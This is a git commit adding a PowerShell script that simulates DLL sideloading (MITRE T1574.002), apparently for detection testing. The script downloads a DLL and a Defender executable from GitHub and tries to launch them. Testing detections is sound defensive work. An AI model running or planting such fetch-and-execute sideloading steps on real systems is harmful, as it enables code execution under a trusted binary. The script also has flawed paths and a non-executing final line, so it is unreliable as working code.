e06e407583b97fa14848ea33898c936c206c9b11
Spencer Alessi <salessi@corp.securit360.com>
2022-08-03 09:36:19 -0400

    t1574.002 first commit

---
+++ T1574.002/DLL_Sideloading_MpCmdRun.ps1
@@ -0,0 +1,11 @@
+# Create folder on desktop for testing
+if (!(Test-Path "c:\$env:USERNAME\Desktop\DLL-Sideloading")){
+    New-Item -ItemType Directory "c:\$env:USERNAME\Desktop\DLL-Sideloading"
+}
+
+# Download the necessary files
+Invoke-WebRequest "https://raw.githubusercontent.com/SecurIT360/TTP-Detection-Testing/main/T1574.002/mpclient.dll" -OutFile "c:\$env:USERNAME\Desktop\DLL-Sideloading\mpclient.dll"
+Invoke-WebRequest "https://raw.githubusercontent.com/SecurIT360/TTP-Detection-Testing/main/T1574.002/MpCmdRun.exe" -OutFile "c:\$env:USERNAME\Desktop\DLL-Sideloading\MpCmdRun.exe"
+
+# Execute
+"c:\$env:USERNAME\Desktop\DLL-Sideloading\MpCmdRun.exe"
